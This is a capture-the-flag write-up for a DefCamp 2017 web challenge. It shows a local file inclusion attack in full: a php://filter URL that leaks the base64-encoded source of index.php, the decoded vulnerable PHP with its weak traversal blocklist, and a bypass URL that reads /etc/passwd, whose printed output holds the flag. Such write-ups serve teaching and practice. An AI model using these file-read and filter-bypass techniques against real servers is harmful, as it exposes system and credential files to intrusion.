# Challenge

This is our new admin platform interface. Can you test it? 

# Walkthrough/Solution

We are presented with a login page after visiting `https://junior2.dctf-quals-17.def.camp/?page=theme/admin/login`. Upon logging in, you will be redirected to `https://junior2.dctf-quals-17.def.camp/?`, which is the index page of the website.

Viewing the source of the initial page showed a hint:
```
<!-- Probabilly at some point you will figure it out that you should always press ctrl+u to see if this page is just a plain html page and you don't have to break this!
Have you tried the index.php?
Maybe I was lazy enought to edit it with nano.
 -->
 ```
 
 I tried to test if the website is weak to LFI. Since the .php file would be executed when you load it in the browser, you can use this neat trick to encode the file contents first before it executes:
 ```
 https://junior2.dctf-quals-17.def.camp/?page=php://filter/convert.base64-encode/resource=index
 
 The above would return you a base64 encoded string:
 PD9waHAKJHBhZ2UgPSAkX0dFVFsicGFnZSJdOwokdHlwZSA9ICRfR0VUWyJ0eXBlIl07CmlmIChzdHJwb3MoJHBhZ2UsICcuLy4uLycpICE9PSBmYWxzZSl7CgloZWFkZXIoIkxvY2F0aW9uOiBodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PWRRdzR3OVdnWGNRIik7CglkaWUoKTsKfQoKaWYgKHN0cnBvcygkcGFnZSwgJy4uLi8uLycpICE9PSBmYWxzZSl7CgloZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vbGVla3NwaW4uY29tLyIpOwoJZGllKCk7Cn0KCmlmIChzdHJwb3MoJHBhZ2UsICclJykgIT09IGZhbHNlKXsKCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly93d3cubnlhbi5jYXQvIik7CglkaWUoKTsKfQoKaWYgKHN0cnBvcygkcGFnZSwgJ2ZpbGxlJykgIT09IGZhbHNlKXsKCWhlYWRlcigiTG9jYXRpb246IGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL3dhdGNoP3Y9bzFlSEtmLWRNd28iKTsKCWRpZSgpOwp9CgppZiAoc3RycG9zKCRwYWdlLCAnL2V0Yy9wYXNzd2QnKSA9PT0gMCkgewoJaGVhZGVyKCJMb2NhdGlvbjogaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kalYxMVhiYzkxNCIpOwoJZGllKCk7Cn0KIyBJIHdvbmRlciBpZiBJIGNhbiBieXBhc3MgcGF0aCB0cmF2ZXJzYWwgcmVzdHJpY3Rpb24gYnkgZ29pbmcgYmFjayBhbmQgZm9yd2FyZCB3aXRoaW4gdGhlIGRpcmVjdG9yaWVzLi4uLgppZiAoJHR5cGUgPT0gIiIpewoJZWNobyBmaWxlX2dldF9jb250ZW50cygkcGFnZS4iLnBocCIpOwp9IGVsc2UgewoJI21heWJlIHdlIG5lZWQgc29tZXRoaW5nIGZyb20gdGhlIHdlYnNpdGUgCgllY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCRwYWdlKTsgCn0KPz4=
 ```
 
 Decoding the base64 encoded string gives you the source of `index.php`. A faster method would be to do this, `view-source:https://junior2.dctf-quals-17.def.camp/?page=index`.
 
 ```
 Source of index.php
 
 
<?php
$page = $_GET["page"];
$type = $_GET["type"];
if (strpos($page, './../') !== false){
	header("Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
	die();
}

if (strpos($page, '..././') !== false){
	header("Location: http://leekspin.com/");
	die();
}

if (strpos($page, '%') !== false){
	header("Location: http://www.nyan.cat/");
	die();
}

if (strpos($page, 'fille') !== false){
	header("Location: https://www.youtube.com/watch?v=o1eHKf-dMwo");
	die();
}

if (strpos($page, '/etc/passwd') === 0) {
	header("Location: https://www.youtube.com/watch?v=djV11Xbc914");
	die();
}
# I wonder if I can bypass path traversal restriction by going back and forward within the directories....
if ($type == ""){
	echo file_get_contents($page.".php");
} else {
	#maybe we need something from the website 
	echo file_get_contents($page); 
}
?>
```
Performing path traversal to read `/etc/passwd` would be the way to solve this challenge. However, `../` sequences and `/etc/passwd` paths are filtered.

To get around the filters, you can just do this `https://junior2.dctf-quals-17.def.camp/?page=/etc/./passwd&type=lol` and the flag is inside the file:
```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
DCTF{7569fd:x:1001:1001::/home/DCTF{7569fd:
4bf5b7ded2f:x:1002:1002::/home/4bf5b7ded2f:
c48b33a7972:x:1003:1003::/home/c48b33a7972:
c0752d13db4:x:1004:1004::/home/c0752d13db4:
32ff9930a99:x:1005:1005::/home/32ff9930a99:
6c567ea3321:x:1006:1006::/home/6c567ea3321:
13b}:x:1007:1007::/home/13b}:
```
# Learning outcome
1. Bypassing path traversal filters
